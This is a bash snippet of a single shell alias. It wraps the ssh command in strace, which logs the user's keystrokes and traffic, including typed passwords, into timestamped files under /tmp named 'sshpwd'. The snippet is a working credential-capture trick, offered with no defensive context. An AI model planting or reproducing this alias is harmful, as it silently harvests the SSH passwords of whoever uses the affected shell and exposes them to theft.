#!bash
alias ssh='strace -o /tmp/sshpwd-`date    '+%d%h%m%s'`.log -e read,write,connect  -s2048 ssh'